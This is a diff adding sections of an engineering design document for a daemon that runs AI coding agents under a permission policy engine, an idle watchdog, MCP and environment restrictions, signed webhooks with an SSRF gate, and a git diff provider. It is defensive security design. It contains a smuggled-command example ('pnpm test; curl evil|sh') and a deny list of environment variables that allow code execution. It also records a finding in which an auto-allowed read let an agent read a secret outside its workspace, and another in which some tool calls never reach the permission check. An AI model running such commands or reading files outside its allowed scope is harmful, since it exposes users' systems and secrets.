+* `cancel()` — **before** `session/cancel` reaches stdin. An agent blocked on our answer may never read the
+  cancel, so cancelling first is how a turn hangs forever. Asserted by method order on a recording agent.
+* `#doClose` and `#doHibernate` — a hibernated worker's process is gone; leaving an agent's request hanging
+  on a dead pipe is F1's lesson.
+* `daemon.stop()` — **before** the dispatcher drains and before workers are closed. A log that ends on a
+  `pending` interaction is a log that lies.
+
+`InteractionStrategy.permission()` / `.elicitation()` **never reject** except with `AcpRequestError`: every
+failure path resolves to `permission_error` (→ `-32603`) or `elicitation_decline`. A rejected promise there is
+an agent waiting forever on a JSON-RPC id.
+
+### 19.9 What the turn projection records, and what it must not double-count
+
+F31 is the reason the daemon records the outcome itself: **accept and decline are indistinguishable in the
+agent's stream** — both end `end_turn`, and both leave the `AskUserQuestion` tool call `status:"completed"`,
+with decline's `rawOutput` reading *"The user did not answer the questions."*. As with a denied permission
+(M1's finding 7), `stopReason` carries no signal, and here neither does `tool_call_update.status` — the one
+place finding 7 said to look. **`deny` and `parkTimeoutAction` results cannot be recovered from the agent's
+stream at all.**
+
+F32 is the reason nothing is counted twice: an `elicitation/create` is **also** mirrored as a `tool_call`
+(`_meta.claudeCode.toolName: "AskUserQuestion"`, `kind:"other"`). `TurnResult.interactions` is folded from
+`omni.policy_decision`; `TurnResult.toolCalls` is folded from `tool_call*`; **neither feeds the other**, and
+`InteractionRecord.toolCallId` is the join a consumer uses if it wants one.
+
+`deniedToolCalls` is gated on `method === "session/request_permission"` — a declined elicitation leaves its
+tool call `completed`, so joining it there would report a tool we blocked that in fact ran to completion.
+There is a named table test for exactly that.
+
+Two `materialize` advisories, daemon-authored and prose-free:
+
+```
+TurnWarning{ code: "interaction_declined", source: "policy" }   // an elicitation settled decline/cancel
+TurnWarning{ code: "interaction_expired",  source: "policy" }   // parkTimeoutAction fired instead of a human
+```
+
+### 19.10 The envelope sequences, byte for byte
+
+**Auto-resolved (`onUnresolved:"deny"`, M2-A's default) — M1's two envelopes, in M1's order:**
+
+```
+acp.interaction      { requestId, kind, method, status:"answered"|"failed", request:<mapped>, raw,
+                       toolCallId, answer:{ optionId, by:"baseline", parkedMs: 0 } }     payloadVersion 2
+omni.policy_decision { requestId, kind, method, title, decision, by:"baseline",
+                       rule:"m0:auto-deny", ruleSource:"baseline", parkedMs: 0, optionId, offered,
+                       toolCallId }                                                       payloadVersion 2
+```
+
+Only `payloadVersion` and the added fields differ from M1, which is why **`permission-deny` and every M1
+permission test run unedited** and why `baselineInteractions` is asserted against an M1 golden.
+
+**Parked, then answered by a human:**
+
+```
+n+0  acp.interaction   { status:"pending", park:{parkedAt, expiresAt, onTimeout}, request, raw }
+n+1  omni.worker_state { state:"requires_action", previous:"running", reason:"interaction_parked",
+                         interactions:[x_…] }
+       … 41 s …
+n+2  acp.interaction   { status:"answered", answer:{ optionId:"allow-once", by:"human",
+                                                     byToken:"tok_ci", parkedMs: 41230 } }
+n+3  omni.policy_decision { decision:"allow", by:"human", rule:"human:tok_ci", parkedMs: 41230, … }
+n+4  omni.worker_state { state:"running", previous:"requires_action", reason:"interaction_resolved" }
+```
+
+Two consequences that must be tested: `acp.interaction` for one `requestId` may appear **twice** (pending,
+then terminal) where M1 emitted it once, so an SSE consumer keys on `requestId` and never counts frames; and
+`omni.policy_decision` appears **exactly once**, at settlement (M2-R4).
+
+---
+
+## 20. The policy rule engine and `policyCeiling` (M2-B; D4)
+
+### 20.1 Where the engine sits
+
+```
+InteractionRequest ──► toPolicySubject() ──► PolicyEngine.decide() ──► PolicyVerdict {action}
+                          (realpath)            PURE, TOTAL                    │
+                                                                               ▼
+                                      selectOption(action, offered, cfg)  ← D4 rules 1-6, unchanged
+                                                                               │
+                                                                RequestPermissionResponse | null
+```
+
+**The engine's whole vocabulary is `PolicyAction`. It never sees and never produces an `optionId.**
+`selectOption` is extracted from `permission-responder.ts` verbatim and is the only function in the
+repository allowed to choose one; `permission-responder.test.ts` must pass **unedited**, and that is an
+acceptance bullet rather than a hope. The `policy-never-names-an-option` guard fails the build if
+`packages/core/src/policy/**` contains the strings `optionId`, `allow_always`, `allow_once`, `reject_once`
+or `outcome`, or imports `PermissionOption`.
+
+### 20.2 Resolution and merge order
+
+`preset(s) ⊕ inline`, **inline last, first match wins**. Inline rules can therefore *narrow* a preset and
+can never *widen* it, because widening is what the ceiling refuses. `extends` resolves transitively; a cycle
+is a config **load** error. `PolicySnapshot.sources` names every layer in order, so an operator reads what
+was actually in force rather than reconstructing it.
+
+`rule` on the record is `"<policyId>#<ruleId>"` or `"<policyId>#default"`, and `ruleSource` says which layer
+it came from — that is how an operator tells a ceiling clamp from an author's intent.
+
+### 20.3 The match table, decided
+
+| clause | rule | grounded in |
+| ------ | ---- | ----------- |
+| `kind` | matches iff `subject.kind` is in the set, case-sensitively. An **unknown** kind — including one nobody has seen yet — matches nothing but the literal `["*"]`. | D4 rule 6, lifted from the responder to the matcher: fail closed |
+| `path` | matches iff `paths` is **non-empty** and **EVERY** path matches at least one glob. A rule with `path` but no `kind`/`subject` is a **config load error**. | **F38**: codex's `locations[]` under-reports (one `read` whose `rawOutput` dumped a file the locations never named). A path clause can only ever *narrow*; a path-less call must never satisfy one; an unlisted second path must never launder the first (M2-R17) |
+| `cmd` | matches only when `subject.type === "command"`, against `subject.command`, **anchored** (`^(?:…)$` applied for you), length-capped, no backreferences, compiled once at create. A `cmd` clause on a `tool_call` subject is **rejected at compile**. | **F38** again: codex's `read`-classified call carries no `rawInput` at all, so there is nothing to match. Anchoring is why `pnpm test` cannot match `pnpm test; curl evil\|sh`. A catastrophic-backtracking pattern is rejected at config **load**, not at request time — a hung regex in the permission path is a hung turn (M2-R18) |
+| `title` / option `name` | **not matchable, at all** | **F27**: one `{optionId:"allow-with-updates", kind:"allow_always"}` arrived under three different names, one embedding a path. Titles are model-authored English and `no-agent-prose` already forbids branching on them |
+| glob case | `allow` rules match **case-sensitively**; `deny` / `park` / `fail` rules match **case-insensitively** | on a case-insensitive volume one file has many spellings. Making the grant harder to satisfy and the restriction easier is the only assignment that fails closed in both directions |
+
+`toPolicySubject` realpaths every location, and for a file that does not exist yet (a create) it realpaths
+the deepest existing ancestor and re-appends the remainder — otherwise every `allow` rule for `src/**` fails
+on exactly the writes it exists to permit. A symlink inside `src/` that resolves outside it does **not**
+satisfy `src/**`.
+
+### 20.4 The shipped presets — data, not code
+
+```yaml
+deny-all:  { default: deny }
+readonly:  { default: deny, rules: [ { id: r1, match: { kind: [read, search, think, fetch] }, action: allow } ] }
+src-edit:  { extends: readonly, default: park,
+             rules: [ { id: e1, match: { kind: [edit], path: ["src/**","test/**","tests/**"] }, action: allow },
+                      { id: d1, match: { kind: [delete] },                                     action: deny  },
+                      { id: c1, match: { subject: command, cmd: "(pnpm|npm) (test|run build)" }, action: allow } ] }
+full:      { default: allow, rules: [ { id: p1, match: { kind: [delete] }, action: park } ] }
+```
+
+> **`readonly` carries a documented hazard and the docs must say it out loud (F37).** A `kind: read`
+> auto-allow **exfiltrates any absolute path a client can name**: claude-acp expanded an out-of-`cwd`
+> `resource_link` into a `Read` whose only containment marker was a vendor `_meta` **string**, and we
+> answered `allow-once` and it echoed `OUTSIDE-SECRET-BETA`. The mitigation is not in the policy file — it is
+> §26's prompt-content containment, which rejects the link *before the prompt is sent*. For deployments that
+> want a second layer, `readonly-contained` adds `path: ["**"]` to every allow rule, which makes `paths`
+> **required** and therefore contained after realpath.
+
+### 20.5 `policyCeiling`, enforced twice
+
+D4: *内联规则与预设的合并结果不得超过它——超过返回 403 `policy_exceeds_ceiling`*.
+
+Containment of two rule *files* is undecidable (regex ∩ regex, glob ∩ glob), so **the ceiling is deliberately
+not written in the rule language** (M2-R11). It is written over finite domains plus a prefix test, which
+makes the 403 a proof rather than a hope.
+
+The action lattice, and one non-obvious tie:
+
+```ts
+const RANK = { deny: 0, fail: 0, park: 1, allow: 2 };
+// `fail` and `deny` rank EQUAL: neither grants anything. `fail`'s extra effect — cancelling the turn — is a
+// denial of service to the caller's OWN run, not a privilege. A tie resolves to the POLICY's action, never
+// the ceiling's, so a ceiling can lower an action and can never change one it already permits.
+const dominates = (ceiling, action) => RANK[action] <= RANK[ceiling];
+```
+
+**Layer 1 — `assertWithinCeiling`, at create.** Decidable, total, and it names the offending rules:
+`maxAction` dominance per rule and for `default`; every `allow` rule's `kind`s ⊆ `allowKinds`; no rule above
+`deny` touching a `denyKind`; every `path` glob's non-wildcard head lexically inside a `pathRoot`; an
+**unscoped** `allow` rule (no `path` clause) is contained only when the ceiling has no `pathRoots` at all;
+`subject: command` refused when `commands: false`; `onUnresolved:"park"` refused when `park: false`. Failure
+is `403 policy_exceeds_ceiling` with `body.policy.{ceiling, offending}`.
+
+**Layer 2 — `clampVerdict`, at decision time.** The static check is explicitly **incomplete** — it cannot see
+that `path: "**"` under a ceiling of `pathRoots: ["src"]` will match `/etc/passwd` — so every verdict is
+clamped against the ceiling for the *actual* subject. A clamped decision writes `clamped:{from, by}` on
+`omni.policy_decision` **and** a `TurnWarning{code:"policy_clamped", source:"policy"}`. **It is never
+silent**: a policy that is quietly narrower than it reads is how an operator plans around a rule that never
+fires. A test proves the clamp catches a case the static check provably cannot.
+
+### 20.6 `alertOnUnpoliced` — the thing that is invisible in the frame
+
+F40: a read-only `ls -A <cwd>` (`kind:"execute"`, `toolName:"Bash"`) ran to `completed` with **no** permission
+request, while `python3 -c …` in the same `cwd` raised one. The split is decided inside the host and is not
+visible anywhere in the `tool_call` frame, so the daemon **cannot predict** which calls will reach the engine.
+
+Two consequences, both binding: policy is evaluated on what actually **arrives**, never on what we expected
+to arrive; and **"no permission request" must never be read as "no tool ran"**. `PolicyPreset.alertOnUnpoliced`
+lists kinds that must never pass unnoticed, and a tool call of a listed kind that never reached the engine
+becomes `TurnWarning{code:"unpoliced_tool_call", source:"policy"}` on the turn.
+
+### 20.7 Conformance
+
+`runPolicyConformance` is written **once** and run by three packages — against `baselineInteractions` (which
+must still satisfy every rule), against the compiled engine, and against a fully assembled daemon in
+integration. That is the single mechanism that keeps "D4's six hard rules preserved" from being a claim.
+Rules 1, 3, 4, 5 and 6 are asserted against a **generated** `offered` array (a fixed 64-row table plus a
+seeded shuffle — no new dependency), including the empty array, the unknown-kind-only array, and the
+`allow_always`-only array whose correct answer is `-32603`.
+
+---
+
+## 21. The idle watchdog (M2-A; DESIGN §7)
+
+### 21.1 Shape: a pure fold beside a thin timer
+
+`watchdogStep(state, signal, config)` is **pure** — no clock, no I/O, 100 % branch-covered by a table — and
+`createWatchdog` wraps it in one `Clock.setTimer`. This is exactly the `HibernateTimer` split, and it is what
+makes every corpus lesson below a unit test with no process.
+
+The two are **mutually exclusive by state**: the hibernate timer runs only in `ready`, the watchdog only while
+a turn is live. An invariant test asserts that for every state at most one of the two is armed.
+
+### 21.2 The two budgets, and where the clock starts
+
+| budget | when | default | DESIGN |
+| ------ | ---- | ------- | ------ |
+| `silentMs` | no envelope appended for this turn, no tool call open | 300 s | 无消息 N 分钟杀 |
+| `toolMs` | at least one tool call **open** (opened, no terminal status) | 1800 s | npm install 沉默 20 分钟是正常的 |
+
+**The clock starts at the LAST ENVELOPE APPENDED, never at the prompt response.** F25 is 7/7 on claude-acp:
+`session_info_update` lands **5–22 ms after `session/prompt` resolves**, in every single M2 run. codex emits
+its `threadStatus:{idle}` **before** the response. A window anchored on the response races a post-response
+update on one agent and truncates the other. `WatchdogSignal.envelope` carries the whole envelope, so the
+anchor is literally the log's last append.
+
+A **replayed** envelope (`replay: true`) is **not** activity: counting it would let a `session/load` replay
+hold a dead turn's budget open.
+
+`0` disables that budget only, and "disabled" means "never fires" — never "fires now".
+
+### 21.3 Opening and closing a tool call
+
+Only `completed` and `failed` are terminal. Everything else is open, including `null`:
+
+* `tool_call` always (re)opens;
+* `tool_call_update` with a terminal `status` closes;
+* a **sparse** `tool_call_update` carrying only `content` and no `status` neither opens a closed call nor
+  closes an open one — `ToolCallUpdate`'s absent-means-unchanged semantics, which M1's `reduceTurn` already
+  implements (F23);
+* the open set is emptied by `turn_end`, **never by hope**. F36: on both agents a cancelled call receives no
+  terminal update at all, so "in flight" can be a permanent condition. That is precisely why `toolMs` is a
+  budget and not a suspension.
+
+### 21.4 The one cross-work-package invariant
+
+> **A parked interaction disarms BOTH budgets, and unparking RE-BASES rather than resumes.**
+
+A human thinking is not a hung agent, and the park timer (`parkTimeoutMs`) owns that deadline — running two
+deadlines against one wait is how a worker gets killed 120 s into a ten-minute approval. Re-basing matters
+just as much: a human who took twenty minutes must not hand the agent a budget that is already spent, which
+would cancel the very turn they just unblocked.
+
+Note also that during a claude-acp elicitation the `AskUserQuestion` tool call is **open** (F32), so without
+this rule the `toolMs` budget would be running against a human.
+
+It is asserted in **three** places, owned by three different packages: the pure fold's table, the park
+registry's own test, and the assembled `watchdog.itest.ts`.
+
+### 21.5 Firing, and what the turn then says
+
+```
+budget spent → omni.error{ code:"agent_timeout", message:"idle watchdog: no activity for <n>ms
+                           (budget <m>ms, <k> tool call(s) open)" }        ← appended FIRST
+             → worker_state{ reason:"watchdog_idle", watchdog:{budget, idleMs, openToolCalls} }
+             → handle.cancelInternal(...)   → session/cancel
+             → cancelTimeoutMs elapses      → close("cancel_timeout")      ← M1's EXISTING reason
+```
+
+The `omni.error` is appended **before** the agent is touched, because it is what makes `reduceTurn`'s verdict
+`failed` and what a `?since=` reader sees. `cancelInternal` is **not** lease-gated (M2-R20).
+`watchdog.cancelTimeoutMs > turn.cancelGraceMs` is enforced by `DaemonConfig.superRefine`: without it a slow
+but healthy settle gets closed as `cancel_timeout` and the operator sees a fake agent timeout.
+
+**No new `WorkerCloseReason`, and no synthesized tool status.** `cancel_timeout` already exists and already
+maps to `agent_timeout` in `CLOSE_REASON_CODE`. The stranded calls are **reported** in
+`TurnResult.strandedToolCalls` with `verdict:"partial"` (M2-R8), and `TurnResult` aggregation **never blocks**
+waiting for a terminal update — a turn whose only tool call stays `pending` still settles.
+
+### 21.6 Restart
+
+**The watchdog never needs to survive one, and a test asserts it.** M1's boot adoption turns every live-state
+row into `hibernated` or `closed`, so a `running` worker cannot exist across a boot and there is nothing to
+re-arm. This is stated as an acceptance bullet so nobody "helpfully" persists it.
+
+---
+
+## 22. `POST /v1/workers/{wid}/config` (M2-A; H24)
+
+### 22.1 The three traps, all corpus-grounded
+
+1. **No notification is emitted.** Neither agent sends `config_option_update` for a
+   `session/set_config_option` (F34 claude, F35 codex) — unlike `session/set_mode`, which does notify (M1's
+   finding 11). So `WorkerSnapshot.configOptions` is refreshed **from the method's own result** and never
+   from the event stream. A test with a stream that carries no notification still sees the new value, and a
+   planted spurious `config_option_update` is **ignored**.
+2. **The result is a full replacement whose membership can shrink.** F34: `session/new` returned four
+   (`mode`, `model`, `effort`, `fast`); after `{configId:"model", value:"haiku"}` the result returned **two**
+   (`mode`, `model`), because Haiku exposes no effort levels. Merging by id would leave a phantom `effort`
+   on the snapshot forever. F35: codex's five all survive every set. **Membership churn is a per-agent
+   behaviour, not a protocol rule — replacing wholesale is the only handling correct for both.**
+3. **Two words for one thing.** The **request** parameter is `configId` (`optionId` answers `-32602` on
+   claude-acp); each returned **entry** is keyed `id`. `SetConfigBody` names the canonical request word and
+   `Normalizer.mapRequest("session/set_config_option", …)` does the per-agent translation, so this route
+   adds no agent branch; `viewConfigOptions` lifts the entry's `id` through the descriptor's
+   `configOptionIdField` quirk. Which spelling the *entries* use has been measured for claude-acp only, so
+   that quirk carries its own `unverified` row until somebody measures codex's.
+
+### 22.2 Contract
+
+| | |
+| --- | --- |
+| gating | lease-gated (`423`), fenced by `Omni-Lease-Epoch` |
+| state | `409 worker_busy` while a turn is live (M2-R22: unknown, not forbidden — fail closed with a message that says so). Auto-**wakes** a `hibernated` worker exactly as `prompt` does. `ready` succeeds |
+| bad value | `502 agent_error` carrying the agent's `-32603` verbatim, including `data.details` (F44). Classified through the descriptor's `errorRules` on **code + a JSON pointer into `data`**, never on message text |
+| result | `SetConfigResponse{ configOptions, removed, added, stale }`. `stale: true` ⇒ the method returned **no** list: the previous one is **KEPT** and never merged with a guess |
+| stream | the route appends a Normalizer-synthesized `acp.session_update{config_option_update}` carrying `_meta["omni/source"]:"set_config_option"`, so a streaming client still learns and an agent-emitted notification stays distinguishable from ours (M2-R23) |
+| snapshot | `WorkerSnapshot.configOptions` is the LIVE list; `AgentCapabilitiesSnapshot.configOptions` is frozen at handshake and becomes the historical record. A wake re-seeds the live list from `reopen`'s result, because a resumed session may report a different catalogue |
+| SDK | `worker.config` is updated **synchronously with the promise `setConfig()` resolves** — no round trip, no notification wait. A failed set leaves it **unchanged**: a half-updated snapshot is worse than a stale one |
+
+`_meta.quota.model_usage[0].model` changing to `claude-haiku-4-5-20251001` on the next turn (F34) is what makes
+the compat case an assertion about *reality* rather than about an echo. codex's `reasoning_effort` is the
+counter-example and is recorded as **data, not as an assertion**: F35 says the following turn still reports
+`thoughtTokens: 0`, so there is no wire evidence a client can use to confirm the effort applied.
+`expect.configEffectObservable: false` is a YAML row, not a code branch.
+
+---
+
+## 23. MCP presets, `mcpCapabilities` filtering, and per-worker `env` (M2-B)
+
+### 23.1 A client may name a preset and can never express a command
+
+DESIGN §8 calls `mcpServers` 最高危攻击面, and M2 makes that a **type** rather than a validator:
+`CreateWorkerRequest.mcp` and `CreateRunRequest.mcp` are `string[]`, and `McpServerPreset.command` is
+reachable only from `DaemonConfig`. The `client-never-sends-a-command` guard asserts both halves — the type,
+and that no route ever constructs an `McpServerPreset` from a request body.
+
+| condition | answer |
+| --------- | ------ |
+| unknown preset name | `400 bad_request` **naming it** — never a silent drop, which would let a client believe a tool was available |
+| name outside the token's `mcpPresets` allowlist | `403 forbidden`. The allowlist default is `[]`, not `"*"` — fail closed |
+| preset the agent cannot host | **dropped and reported**, not an error (§23.2) |
+| a preset that vanished from config between hibernate and wake | the wake closes the worker with `acl_revoked` — M1's precedent for a config change invalidating a live worker (§15.5's 403 row) |
+
+Resolution happens in `AuthContext.assertMcp`, so `SessionOpenOptions.mcpServers` carries **resolved objects**
+and a `SessionStrategy` never sees a name. §12.3 row 22's MCP `type` injection — implemented and unit-tested
+in M1, **unreachable from the wire** — becomes reachable and gets its first end-to-end test.
+
+### 23.2 Filtering is reporting, not silence
+
+DESIGN §6.2 says `initialize`'s `mcpCapabilities` decides which entries may enter `session/new`, and that some
+runtimes do not declare the block but accept stdio. So:
+
+* **stdio is the baseline** and is never filtered — v1 has no `mcpCapabilities.stdio` bit, and codex-acp
+  advertises `{acp:false, http:true, sse:false}` while happily taking stdio;
+* `http` / `sse` require the corresponding bit;
+* when the block is **absent**, the descriptor's `toleratesOmittedMcpCapabilities` quirk decides — from the
+  descriptor, never from an agent-id branch (§17.1);
+* a dropped preset lands on `WorkerSnapshot.mcp.dropped` as `{name, reason}` **and** produces a
+  `TurnWarning`. DESIGN §6.2 says filter, so filtering is right; silence is not.
+
+### 23.3 Per-worker `env` — rejected, not dropped
+
+`ENV_DENY_EXACT` / `ENV_DENY_PREFIX` (§5.8.7) live in **one** module, beside `hashSecret` and `redactArgs`,
+for the same reason those do: a second copy is how one of two callers quietly stops enforcing it.
+`DaemonConfig.envDeny` **extends** the hard list; nothing shrinks it, and a test proves that.
+
+DESIGN §5.1's five (`HOME PATH USER SHELL TMPDIR`) plus the `OMNI_*` prefix are the floor. The list is longer
+because several more are **arbitrary code execution in the agent's process, not a preference**:
+`NODE_OPTIONS`, `BASH_ENV`, `ENV`, `IFS`, `LD_*`, `DYLD_*`, `RUBYOPT`, `PERL5OPT`, `JAVA_TOOL_OPTIONS`.
+
+| rule | why |
+| ---- | ---- |
+| A blacklisted key is **`400`, naming it** — never dropped | M2-R12: a worker that silently ignored half the environment it was asked for behaves differently from what the caller asked, and nothing says so |
+| A key outside the token's `envAllow` is `403` | the ACL is per token, like `agents` and `cwdRoots` |
+| Comparison **folds case on win32** and not elsewhere, and `platform` is **injected** so both branches are tested | Windows env names are case-insensitive; comparing case-sensitively there lets `{"path": …}` sail past a deny list that only knows `PATH` and replace it for real |
+| Keys must match `/^[A-Za-z_][A-Za-z0-9_]*$/`; values may not contain NUL; the whole map is size-capped | a boundary, not a suggestion |
+| It layers **on top of** the descriptor's config-supplied env and can never overwrite it | DESIGN §5.1: 叠加在 daemon 密钥库注入的凭据之后 |
+| **`WorkerSnapshot.envKeys` carries names only.** A value never reaches a snapshot, a log line or an HTTP body | DESIGN §8. A grep test asserts it across a full create-prompt-close cycle |
+
+**Restart, and the honest trade.** A hibernated worker's `env` must be reapplied on wake, or the woken worker
+is a different worker wearing the same id — so `WorkerRow.env` is persisted, in the `0600` database inside the
+`0700` `dataDir`. That is a real exposure and §11.9 names it. The escape hatch is `env.persist:false` per
+worker, which forces `capabilities.resume.method = null` so the worker can never hibernate
+(`hibernate.whenNotResumable` then governs) rather than waking into a silently different environment.
+
+---
+
+## 24. Run API and webhook delivery (M2-B; D9, DESIGN §9.3)
+
+### 24.1 A Run is create + prompt + settle + close
+
+`POST /v1/runs` = create a worker, prompt it, aggregate the `TurnResult`, then close it (or keep it under
+`keepWorker: true`). `GET /v1/runs/{rid}/events?since=` **proxies the run's worker log**, so `?since=`
+semantics are M1's byte for byte, `sse.ts` stays frozen and checksum-guarded, and `sse-resume.itest.ts`'s
+frame comparison is reused against a run's stream.
+
+`idempotencyKey` is scoped to the token, backed by a unique index, and a repeat returns the **original** run
+— across a restart. A run whose worker parks reports `state:"requires_action"` and fires
+`run.requires_action`; answering through the run's worker's `POST …/interactions/{reqId}` resumes it.
+
+### 24.2 Schema v2 — CREATE-only
+
+`SCHEMA_VERSION` 1 → 2 adds two tables and changes **no** column of `events` or `workers`, so an M1
+`events.db` opens, `headOf`/`tailOf` are untouched, and §14.11's conformance suite runs verbatim. A v2 file
+opened by an M1 daemon still fails loudly naming the version, which is §14.7's existing behaviour.
+
+```sql
+create table if not exists runs (
+  run_id text primary key, daemon_id text not null, boot_id text not null, token_id text not null,
+  worker_id text, turn_id text, agent_id text not null, cwd text not null, state text not null,
+  created_at text not null, updated_at text not null, finished_at_ms integer,
+  request_json text not null,          -- SANITIZED: env VALUES are already stripped
+  result_json text, error_json text, webhook_url text, idempotency_key text
+) without rowid;
+create unique index if not exists runs_idem on runs (token_id, idempotency_key) where idempotency_key is not null;
+create index if not exists runs_by_boot  on runs (boot_id, state);
+
+create table if not exists webhook_deliveries (
+  delivery_id text primary key, run_id text not null, token_id text not null,
+  event text not null, url text not null,
+  state text not null,                 -- pending | delivering | delivered | failed
+  attempt integer not null default 0, next_attempt_ms integer,
+  lease_boot text,                     -- the bootId that owns an in-flight attempt
+  last_status integer, last_error text, response_ms integer,
+  created_at text not null, updated_at text not null, payload_json text not null
+) without rowid;
+create index if not exists deliveries_due on webhook_deliveries (state, next_attempt_ms);
+```
+
+### 24.3 The ladder, the payload and the signature
+
+D9's ladder is a **pure function**: `0s / 30s / 2m / 10m / 30m / 2h`, six attempts, then `failed`. Full
+jitter is applied on every rung after the first, with `rnd` injected so the test is deterministic — without
+it a daemon restart makes hundreds of deliveries due in one tick, the receiver 429s the lot, and they all
+retry together thirty seconds later.
+
+The payload is **thin, and eight keys** (M2-R13): `{deliveryId, event, daemonId, workerId, runId, sessionId,
+seq, ts}`. `workerId` is D9's seventh made addressable — `/v1` is keyed on it, and a receiver holding only
+`sessionId` cannot pull anything back. The `webhook-body-is-thin` guard pins the set at exactly these eight.
+A parked worker's `worker.requires_action` delivery carries **no request content**: thinness is a security
+property here, not only a bandwidth one.
+
+`Omni-Signature: t=<unix-seconds>,v1=<hex>` is HMAC-SHA256 over `"<t>.<raw body>"`. The timestamp is **inside**
+the signed string so a receiver can reject a replay by age (300 s recommended, documented for receivers) and
+can check age without parsing JSON. Signing needs the plaintext, so `webhookSecret` cannot be stored hashed —
+it is never returned by any route, never logged, and `webhookSecretFile` (0600, read at load) is the
+recommended spelling.
+
+### 24.4 Restart safety — the ordering that makes it true
+
+| # | rule | why |
+| - | ---- | --- |
+| 1 | `enqueue` happens in the **same transaction** as the run state change | a run that reached `succeeded` with no delivery row is a webhook that will never be sent and never be retried |
+| 2 | `claim` precedes `fetch`, always. It is one `UPDATE … WHERE state='pending'` stamping `lease_boot` | two dispatchers — or a restarted one racing a zombie — cannot both send, and `lease_boot` is the only thing that later distinguishes "in flight now" from "in flight when the process died" |
+| 3 | Boot: `requeueStale(bootId)` moves foreign-`lease_boot` `delivering` rows back to `pending` with **`attempt` UNCHANGED** | the attempt may never have reached the wire. **This is the guarantee, written down rather than discovered: delivery is AT LEAST ONCE and `deliveryId` is the dedupe key** |
+| 4 | Boot: every live-state `runs` row from a foreign boot becomes `abandoned` with a terminal `run.failed` delivery enqueued | M1's worker adoption already turned that row into `hibernated`/`closed`; leaving the run `running` would make `GET /v1/runs/{rid}` lie for as long as the row survives, and a caller waiting on a webhook must not wait forever because we restarted |
+| 5 | `daemon.stop()` order: **interactions settled → dispatcher.drain(bounded) → workers closed → socket** | draining after killing the workers means the terminal `run.*` webhook races the shutdown |
+| 6 | `redeliver` **keeps the same `deliveryId`** and resets `attempt` to 0 | that is what makes it a dead-letter replay rather than a second event. A receiver that dedupes correctly ignores it — which is correct, because it already has it |
+
+A `3xx` is a **failure, not a follow** (`redirect: "manual"`): following one turns an allowlisted origin into a
+redirect to `169.254.169.254`. A `410 Gone` fails immediately — retrying a retired endpoint for two hours is
+rudeness with extra steps. The receiver's response body is **never read**: it is untrusted, unbounded, and we
+have no use for it.
+
+### 24.5 The dead-letter queue
+
+`GET /v1/webhooks/deliveries` is `role:"admin"` or the owning token only, cursor-paginated, and survives a
+restart; `webhooks.retentionDays` sweeps it on M1's existing retention timer, together with its runs. A slow
+or dead receiver **never blocks a turn**: `dispatch()` enqueues and returns, and a run whose webhook hangs for
+`timeoutMs` still reports its `TurnResult` at the same time as one with no webhook.
+
+### 24.6 The SSRF gate
+
+This is the daemon's first **outbound** surface and the URL comes from a client, so `webhooks.mode` is
+`"allowlist"` with an empty `allow` by default: `POST /v1/runs` with a webhook is `403` until an operator
+names an origin. `"any"` exists for a closed network and says so. Every resolved address is checked against
+`denyCidrs` (loopback, link-local, RFC1918, ULA) before the connect, which blocks DNS rebinding to a cloud
+metadata endpoint. The URL is validated at **create** time, not at delivery time, so a misconfigured run
+fails where the operator can see it. Residual TOCTOU is accepted and recorded in §11.9.
+
+---
+
+## 25. The git diff provider (M2-B; D8)
+
+### 25.1 How an async result reaches a pure fold
+
+`TurnResult.patch` must be **in the log** (so a `?since=` reader and a restart both see it) and `reduceTurn`
+**cannot spawn `git`**. So the patch rides on `state_update{idle}._meta["omni/patch"]`, exactly as
+`vendorPatch` and `warnings` already do (§12.5), and it must exist **before** `idle` is emitted.
+
+The mechanism is one generic hunk in the frozen `turn-lifecycle.ts` (M2-R9): `TurnInput.prompt_result` gains
+`meta?: Record<string, unknown>`, merged into the idle envelope's `_meta`. The reducer does not know what any
+key means. `worker.ts` awaits `provider.end(handle)` bounded by `diff.timeoutMs` and *then* feeds
+`prompt_result` with the meta — so the provider lands with **zero further edits** to a frozen file, and the
+fold acquires no I/O and no descriptor.
+
+`reduceTurn` locally and `GET /turns/{id}` therefore return **deep-equal** `TurnResult`s including `patch`,
+which is D7 re-proven rather than assumed.
+
+### 25.2 The technique, and the flags that are security rather than tidiness
+
+D8: `GIT_INDEX_FILE=$tmp git add -A && git write-tree` before and after, then `git diff-tree -p`. Never the
+user's index; `.gitignore` respected by construction.
+
+* The temp index **must live outside every worktree** — a file inside it would be swept up by `git add -A`
+  and appear in the patch as a change the agent never made. A test asserts the index file never appears in a
+  produced patch, and that the operator's own `.git/index` mtime is unchanged.
+* `add -A` into an **empty** temp index yields a tree that IS the worktree: it needs no `HEAD`, so it works
+  in a repo with zero commits — which is exactly the repo codex creates (F39).
+* `--no-ext-diff --no-textconv` are **security flags**: an operator's `diff.external` / `diff.*.textconv` is
+  arbitrary code, and this runs on every turn. A planted `diff.external` in the test repo's config must **not**
+  execute.
+* `GIT_OPTIONAL_LOCKS=0` — this runs while a human may be using the same repo, so we never take the
+  repository lock. `GIT_TERMINAL_PROMPT=0`, `GIT_PAGER=cat`, `LC_ALL=C`.
+* We never pass `--binary`, so a binary file comes back as git's own `Binary files … differ` line and no blob
+  content is smuggled into a patch.
+* git is reached **only through the injected `RunUtility`**, which is what `no-direct-spawn` already asserts
+  for `fingerprint.ts`'s `ps` — so the unit tests need no git installed at all.
+
+### 25.3 `null` is an answer, and it is always explained
+
+F39: codex-acp creates `.git/`, `.codex/` and `.agents/` in its own `cwd` mid-session. **"Outside a repo ⇒
+`patch: null`" is therefore a per-TURN question**, not a per-worker one, and the provider probes at both ends:
+if the top level appeared, vanished or moved between `begin` and `end`, the answer is `null` +
+`patch_repo_changed`, **never a garbage diff** that reports the whole workspace as added.
+
+Every `null` carries a named `TurnWarning{source:"patch"}`: `patch_no_provider`, `patch_not_a_repo`,
+`patch_repo_changed`, `patch_write_tree_failed`, `patch_diff_failed`, `patch_timeout`, `patch_truncated`,
+`patch_git_missing` (warned once per daemon at info). **A git failure is never a failed turn.**
+
+### 25.4 Two workers, one repo
+
+Each worker has its own temp index, so the operator's index is never touched — but the **tree** is the whole
+worktree, so worker A's "after" contains worker B's edits and can even contain a half-written file. We do not
+silently attribute them: `patchInfo.quality` is `"shared_worktree"` and a
+`TurnWarning{code:"patch_shared_worktree"}` names how many live workers share the repository. Per-worker
+attribution is not attempted; the real fix is one worktree per worker, which is a caller's decision.
+
+`diff.mode:"on_write"` (the default) runs git only when the turn had a write-ish tool call or any `changes`;
+`"always"` exists because codex under-reports (F38 classified a two-file read as one `kind:"read"` call), and
